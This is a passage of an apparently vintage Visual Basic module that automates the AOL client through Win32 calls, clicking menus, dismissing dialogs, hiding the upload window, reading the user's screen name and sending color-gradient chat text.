SetWinOnTop = SetWindowPos(the.hwnd, HWND_TOPMOST, 0, 0, 0, 0, Flags)
End Sub

Sub RunMenu3(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer
Dim AOLMenus
Dim AOLSubMenu
Dim AOLItemID
Dim ClickAOLMenu

AOLMenus = Getmenu(findwindow("AOL Frame25", vbNullString))
AOLSubMenu = GetSubMenu(AOLMenus, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = sendmessagebynum(findwindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub


Sub SendChatStrike(StrikeOutChat)
'This strikes out text in a chat
SendChat ("<S>" & StrikeOutChat & "</S>")
End Sub
Sub UnHideWindow(hwnd)
un = showwindow(hwnd, SW_SHOW)
End Sub



Sub waitforok()
Do: DoEvents
aol% = findwindow("#32770", "AOL Canada")

If aol% Then
closeaol% = SendMessage(aol%, WM_Close, 0, 0)
Exit Do
End If

aolw% = findwindow("_AOL_Modal", vbNullString)

If aolw% Then
AOLButton (FindChildByTitle(aolw%, "OK"))
Exit Do
End If
Loop

End Sub

Sub WaitWindow()
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
topmdi% = getwindow(mdi%, 5)

Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
topmdi2% = getwindow(mdi%, 5)
If Not topmdi2% = topmdi% Then Exit Do
Loop

End Sub




Function YellowBlack(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 255 - F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowBlack = Msg
SendChat (Msg)
End Function
Function YellowBlackYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowBlackYellow = Msg
SendChat (Msg)
End Function
Function YellowBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 255 - F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowBlue = Msg
SendChat (Msg)
End Function
Function YellowBlueYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowBlueYellow = Msg
SendChat (Msg)
End Function

Function YellowGreen(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 255, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowGreen = Msg
SendChat (Msg)
End Function
Function YellowGreenYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, 255 - F)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowGreenYellow = Msg
SendChat (Msg)
End Function
Function YellowPurple(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 255 - F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowPurple = Msg
SendChat (Msg)
End Function

Function YellowPurpleYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowPurpleYellow = Msg
SendChat (Msg)
End Function
Function YellowRed(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 255 - F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowRed = Msg
SendChat (Msg)
End Function

Function YellowRedYellow(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next B
    YellowRedYellow = Msg
SendChat (Msg)
End Function
Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop

End Function
Function GetSN()
On Error Resume Next
Dim welcome As Variant
Dim NameMy As Variant
Dim FuckNamez As String * 255
welcome = FindChildByTitle(findwindow("AOL Frame25", 0&), "Welcome, ")
NameMy = getwindowtext(welcome, FuckNamez, 254)
GetSN = Mid(FuckNamez, 10, (InStr(FuckNamez, "!") - 10))
End Function
 
Public Function GetListIndex(oListBox As ListBox, sText As String) As Integer

Dim iIndex As Integer

With oListBox
 For iIndex = 0 To .ListCount - 1
   If .List(iIndex) = sText Then
    GetListIndex = iIndex
    Exit Function
   End If
 Next iIndex
End With

GetListIndex = -2   '  if Item isnt found
'( I didnt want to use -1 as it evaluates to True)

End Function

Sub UpChatOff()
'  call upchatoff
AOM% = findwindow("_AOL_Modal", vbNullString)
DoEvents
X = showwindow(AOM%, SW_SHOW)
X = SetFocusAPI(AOM%)

End Sub

Sub UpChatOn()
'  call upcahton
Dim aol
Dim AOM
aol = findwindow("AOL Frame25", vbNullString)
AOM = findwindow("_AOL_Modal", vbNullString)
DoEvents
X = showwindow(AOM, SW_HIDE)
X = SetFocusAPI(aol)
End Sub


